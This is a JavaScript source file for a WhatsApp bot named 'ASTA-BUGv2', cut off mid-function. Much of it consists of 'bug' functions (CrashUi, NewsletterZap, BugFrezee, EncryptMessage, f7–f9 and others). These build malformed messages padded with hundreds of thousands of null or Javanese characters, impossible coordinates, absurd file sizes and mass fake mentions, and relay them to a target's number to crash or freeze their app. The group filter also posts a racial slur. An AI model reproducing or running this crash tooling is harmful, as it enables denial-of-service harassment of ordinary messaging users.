module.exports = async (ZoO, m, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
/*const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : */
const prefix = "."
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const To = ["https://files.catbox.moe/796b19.jpeg"]
const ytta = To[Math.floor(Math.random() * To.length)]
const Tol = ["https://files.catbox.moe/rv7j3e.mp3"]
const ytt = Tol[Math.floor(Math.random() * Tol.length)]
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const Premium = JSON.parse(fs.readFileSync('./Databases/database/murbug.json'))
const owner = JSON.parse(fs.readFileSync('./Databases/database/owner.json'))
const pantek = ["https://files.catbox.moe/rv7j3e.mp3"]
const sound1 = pantek[Math.floor(Math.random() * pantek.length)]
const Toll = ["https://files.catbox.moe/rv7j3e.mp3"]
const sound2 = Toll[Math.floor(Math.random() * Toll.length)]
const Tolll = ["https://files.catbox.moe/rv7j3e.mp3"]
const sound3 = Tolll[Math.floor(Math.random() * Tolll.length)]
const Mek = ["https://files.catbox.moe/rv7j3e.mp3"]
const sound4 = Mek[Math.floor(Math.random() * Mek.length)]
const wdh = ["https://files.catbox.moe/rv7j3e.mp3"]
const sound5 = wdh[Math.floor(Math.random() * wdh.length)]
const pol = ["https://files.catbox.moe/rv7j3e.mp3"]
const sound6 = pol[Math.floor(Math.random() * pol.length)]
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const makeid = crypto.randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const jsobfus = require('javascript-obfuscator');
const botNumber = await ZoO.decodeJid(ZoO.user.id)
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 const kontol = m.key.fromMe ? ZoO.user.id.split(':')[0x0] + '@s.whatsapp.net' || ZoO.user.id : m.key.participant || m.key.remoteJid;
const isGroup = m.chat.endsWith('@g.us')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await ZoO.groupMetadata(m.key.remoteJid) : {}
let participant_bot = (isGroup ? groupMetadata.participants.find((v) => v.id == m.botNumber) : {}) || {}
let participant_sender = (isGroup ? groupMetadata.participants.find((v) => v.id == m.sender) : {}) || {}
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const qtext = q = args.join(" ")
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, ucapan, generateProfilePicture, getBuffer, fetchJson } = require('./Databases/function.js')
const antilink = JSON.parse(fs.readFileSync('./Databases/database/antilink.json'))
const antilink2 = JSON.parse(fs.readFileSync('./Databases/database/antilink2.json'))
const contacts = JSON.parse(fs.readFileSync("./Databases/database/contacts.json"))
const kosong = fs.readFileSync("./Databases/kosong.jpg")
const { teksCrashUi } = require("./Databases/database/virtex.js")
const { teksf19 } = require("./Databases/database/delay.js")
const { buttonvirus } = require("./Databases/database/buttonvirus.js")
const { explosion } = require("./Databases/vir/bugcrash.js")
const { Veoni } = require("./Databases/vir/xnaf.js")
const { old1, old2, old3 } = require("./Databases/vir/bugold.js")
const { Cluex } = require("./Databases/database/ClueX.js")
const { pinterest, pinterest2, mediafire, tiktokDl } = require('./Databases/scraper');

/*FUNCTION OBFUSCATE*/
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `ASTA-BUGv2`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}


if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(owner), color(`[ PESAN ]`, `blue`), color(`FROM`, `blue`), color(`${senderNumber}`, `blue`), color(`Text :`, `blue`), color(`${cmd}`, `white`))
}

const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `CʀʏɴᴢX Fᴏʀᴄᴇ`
}}}

if (isGroup) {
if (antilink.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await ZoO.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await ZoO.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} bye nigga 😂!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://files.catbox.moe/796b19.jpeg", title: "｢ LINK DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await ZoO.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await ZoO.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}}}

if (isGroup) {
if (antilink2.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await ZoO.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await ZoO.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} deleted by asta bugv2 🚫`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://files.catbox.moe/796b19.jpeg", title: "｢ LINK🔥DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await ZoO.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}
}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Bot Whatsapp Realtime`,jpegThumbnail: ""}}}

const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `©dave`,jpegThumbnail: ""}}}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `𝙰𝚂𝚃𝙰-𝙱𝚄𝙶`,
jpegThumbnail: "",
caption: `𝐀𝐒𝐓𝐀-𝐁𝐔𝐆v2`,
inviteExpiration: Date.now() + 1814400000
}
}}

const Out = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid :"status@broadcast"
 }: {})},
 message:
 {"orderMessage":
 {"orderId":"174238614569438",
 "thumbnailUrl": kosong, //image 0kb
 "itemCount": 999999999,
 "status":
 "INQUIRY",
 "surface": "CATALOG",
 "message": `𝐀𝐒𝐓𝐀-𝐁𝐔𝐆v2 ©dave`,
 "token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==" }},
 contextInfo: {"mentionedJid":m.sender.split, "forwardingScore":999,"isForwarded":true}}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `dave`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=254114127157:+254114127157\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

let example = (teks) => {
return `\n*Usage Example :*\ntype *${cmd}* ${teks}\n`
}

ZoO.ments = (teks = '') => {
return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []
};

var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}

async function loadingx() {
      var loadingz = [
        "> ⚔️ • CHILL 😹 : 3",
        "> ⚔️ • CHILL 😹 : 3",
        "> ⚔️ • CHILL 😹 : 3",
        "> ⚔️ • CHILL 😹 : 2",
        "> ⚔️ • CHILL 😹 : 2",
        "> ⚔️ • CHILL 😹 : 1",
        "> ⚔️ • CHILL 😹 : 1",
        "> ⚔️ • CHILL 😹 : 0",
        "> ⚔️ • CHILL 😹 : 0",
        "*Done*",
      ];
      let { key } = await ZoO.sendMessage(m.chat, {
        text: "💀",
      });

      for (let i = 0; i < loadingz.length; i++) {
        await sleep(400);
        await ZoO.sendMessage(m.chat, { text: loadingz[i], edit: key });
      }
    }
    
function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}


/*QUOTED BUG SENDER*/
const Null = {
key: {
remoteJid: 'cihuy',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
"interactiveResponseMessage": {
"body": {
"text": "Sent",
"format": "DEFAULT"
},
"nativeFlowResponseMessage": {
"name": "galaxy_message",
"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(500000)}\",\"screen_0_TextInput_1\":\"cihuy\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
"version": 3
}
}
}
}

/*BUG SENDER CRASH HARD*/
    async function CrashUi(X, Qtd, ThM, cct = false, ptcp = false) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "⿻ 𝙰𝚂𝚃𝙰-𝙱𝚄𝙶 ⿻",
                    fileEncSha256:
                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⭑̤▾ ⿻ 𝙰𝚂𝚃𝙰-𝙱𝚄𝙶 ⿻ ▾⭑̤" + "ꦾ".repeat(70000),
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                  buttons: [
                    cct
                      ? {
                          name: "single_select",
                          buttonParamsJson:
                            '{"title":"\n⿻ 𝙰𝚂𝚃𝙰-𝙱𝚄𝙶 ⿻\n\n' +
                            "᬴".repeat(0) +
                            '","sections":[{"title":"⿻ 𝙰𝚂𝚃𝙰-𝙱𝚄𝙶 ⿻","rows":[]}]}',
                        }
                      : {
                          name: "payment_method",
                          buttonParamsJson: "",
                        },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "payment_method",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "single_select",
                      buttonParamsJson:
                        '{"title":"⿻ 𝙰𝚂𝚃𝙰-𝙱𝚄𝙶 ⿻","sections":[{"title":"DEMON WIZARD  ϟ","rows":[]}]}',
                    },
                    {
                      name: "galaxy_message",
                      buttonParamsJson:
                        '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"🔥","flow_id":"BY DEVORSIXCORE","flow_message_version":"9","flow_token":"MYPENISMYPENISMYPENIS"}',
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "{}",
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: Qtd,
        }
      );

      await ZoO.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Bugs By ⭑̤▾ ⿻ 𝙰𝚂𝚃𝙰-𝙱𝚄𝙶 ⿻ ▾⭑"));
    }
    async function f19(p65, p66, p67 = false) {
      let vGenerateWAMessageFromContent12 = generateWAMessageFromContent(p65, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "𝙰𝚂𝚃𝙰-𝙱𝚄𝙶",
                locationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 922.999999999999,
                  name: "𝙰𝚂𝚃𝙰-𝙱𝚄𝙶 ⚔️",
                  address: "𝙰𝚂𝚃𝙰-𝙱𝚄𝙶",
                  jpegThumbnail: fs.readFileSync("./Databases/kosong.jpg")
                },
                hasMediaAttachment: true
              },
              body: {
                text: ""
              },
              nativeFlowMessage: {
                messageParamsJson: "𝙰𝚂𝚃𝙰-𝙱𝚄𝙶 🌷",
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: {
                    title: "𝕯𝖎𝖐𝖆 𝕲𝖆𝖓𝖙𝖊𝖓𝖌",
                    sections: [{
                      title: "𝕯𝖎𝖐𝖆 𝕲𝖆𝖓𝖙𝖊𝖓𝖌",
                      rows: []
                    }]
                  }
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: {}
                }]
              }
            }
          }
        }
      }), {
        userJid: p65,
        quoted: v93
      });
      await ZoO.relayMessage(p65, vGenerateWAMessageFromContent12.message, p67 ? {
        participant: {
          jid: p65
        }
      } : {});
    }
    ;
async function PayMent(LockJids) {
      var messageContent = generateWAMessageFromContent(
        LockJids,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  hasMediaAttachment: true,
                  sequenceNumber: "0",
                  jpegThumbnail: "",
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "review_and_pay",
                      buttonParamsJson: `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\k${VxO},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`,
                    },
                  ],
                  messageParamsJson: "\0".repeat(10000),
                },
              },
            },
          },
        }),
        {}
      );
      ZoO.relayMessage(LockJids, messageContent.message, {
        messageId: messageContent.key.id,
      });
    }
    const VxO = "⭑̤▾ ⿻ 𝙰𝚂𝚃𝙰-𝙱𝚄𝙶 ⿻ ▾⭑⃰" + "\u0000".repeat(50000);
    async function NewsletterZap(LockJids) {
      var messageContent = generateWAMessageFromContent(
        LockJids,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              newsletterAdminInviteMessage: {
                newsletterJid: `120363298524333143@newsletter`,
                newsletterName:
                  "⭑̤▾ ⿻ 𝙰𝚂𝚃𝙰-𝙱𝚄𝙶 ⿻ ▾⭑⃰" + "\u0000".repeat(990000),
                jpegThumbnail: "",
                caption: `⚝𝙰𝚂𝚃𝙰-𝙱𝚄𝙶⚝`,
                inviteExpiration: Date.now() + 1814400000,
              },
            },
          },
        }),
        {
          userJid: LockJids,
        }
      );
      await VxoZap.relayMessage(LockJids, messageContent.message, {
        participant: {
          jid: LockJids,
        },
        messageId: messageContent.key.id,
      });
    }

/*BARA FUNCTION*/

async function OLDLOC(target, QBug) {
var atc = await generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
    message: {
      interactiveMessage: {
        header: {
          title: "𝙰𝚂𝚃𝙰-𝙱𝚄𝙶v2 ©dave\n",
          locationMessage: {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 999.03499999999999,
            jpegThumbnail: global.thumb
          },
          hasMediaAttachment: true
        },
        body: {
          text: "ꦾ".repeat(20) + "@1".repeat(50000)
        },
        nativeFlowMessage: {
          messageParamsJson: " ꦾ".repeat(55000)
        },
        carouselMessage: {}
      }
    }
  }
}), { userJid: target, quoted: QBug })
await ZoO.relayMessage(target, atc.message, { participant: { jid: target }, messageId: atc.key.id })
};

async function BugFrezee(target) {
            ZoO.relayMessage(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                fileLength: "1991837291999",
                                pageCount: 199183729199991,
                                mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                fileName: "DeepDocumentDpr",
                                fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1728631701",
                                contactVcard: true,
                                caption: " ꦾ".repeat(20) + "@1".repeat(50000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                    groupMentions: [{ groupJid: "1@newsletter", groupSubject: "DEMON WIZARD" }],
                                    isForwarded: true,
                                    quotedMessage: {
                                        interactiveResponseMessage: {
                                            body: {
                                                text: "Sent",
                                                format: "DEFAULT"
                                            },
                                            nativeFlowResponseMessage: {
                                                name: "galaxy_message",
                                                paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "😂⃟⃟⃟⃟⃚ ͢𝄽𝗫𝘃𝗢 𝗢𝘂𝘁𝄽⃟⃟⃟⚔️",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "Barainfinity@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                                version: 3
                                            },
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                { participant: { jid: target } }
            );            
        };
        async function EncryptMessage(target) {
    const locationMessageContent = proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        locationMessage: {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 999.03499999999999,
            name: "ꦾ".repeat(50000),
            url: "@1".repeat(30),
            mentionedJid: [
								"1@s.whatsapp.net",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
							],
            jpegThumbnail: global.thumb
        }
      }
    }
    });

    const encryptedMessage = generateWAMessageFromContent(target, locationMessageContent, { userJid: target });

    await ZoO.relayMessage(target, encryptedMessage.message, { participant: { jid: target } });
};

        async function f8(p52) {
      const v98 = {
        name: "review_and_pay",
        buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":k" + ZoO + ",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
      };
      var vGenerateWAMessageFromContent8 = generateWAMessageFromContent(p52, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                hasMediaAttachment: true,
                sequenceNumber: "0",
                jpegThumbnail: ""
              },
              nativeFlowMessage: {
                buttons: [v98],
                messageParamsJson: "\0".repeat(10000)
              }
            }
          }
        }
      }), {});
      ZoO.relayMessage(p52, vGenerateWAMessageFromContent8.message, {
        messageId: vGenerateWAMessageFromContent8.key.id
      });
    }
        async function f9(p53) {
      var vGenerateWAMessageFromContent9 = generateWAMessageFromContent(p53, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            newsletterAdminInviteMessage: {
              newsletterJid: "120363298524333143@newsletter",
              newsletterName: "DikaTheGenkz Script" + "\0".repeat(920000),
              jpegThumbnail: "",
              caption: "Undangan Admin Saluran",
              inviteExpiration: Date.now() + 1814400000
            }
          }
        }
      }), {
        userJid: p53
      });
      await ZoO.relayMessage(p53, vGenerateWAMessageFromContent9.message, {
        participant: {
          jid: p53
        },
        messageId: vGenerateWAMessageFromContent9.key.id
      });
    }
    const v100 = {
      participant: "0@s.whatsapp.net",
      ...(m.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const v103 = {
      key: v100,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: fs.readFileSync("./Databases/kosong.jpg")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"DIKΛƬΉΣGΣПKZ\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const v105 = {
      participant: "0@s.whatsapp.net",
      ...(m.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const v108 = {
      key: v105,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: fs.readFileSync("./Databases/kosong.jpg")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"DIKΛƬΉΣGΣПKZ\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
            async function f7(p47, p48, p49, p50 = false, p51 = true) {
      let vGenerateWAMessageFromContent7 = generateWAMessageFromContent(p47, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "B̷̫͊R̵͚̕Ū̷͉T̴̻͋A̷̼͂L̶͌͜I̶̲̒T̴͕̽Y̷̘͋",
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: global.thumb
                },
                hasMediaAttachment: true
              },
              body: {
                text: "🐉 B̷̫͊R̵͚̕Ū̷͉T̴̻͋A̷̼͂L̶͌͜I̶̲̒T̴͕̽Y̷̘͋🔥ꦾ" + "ꦾ".repeat(77777)
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}"
              }
            }
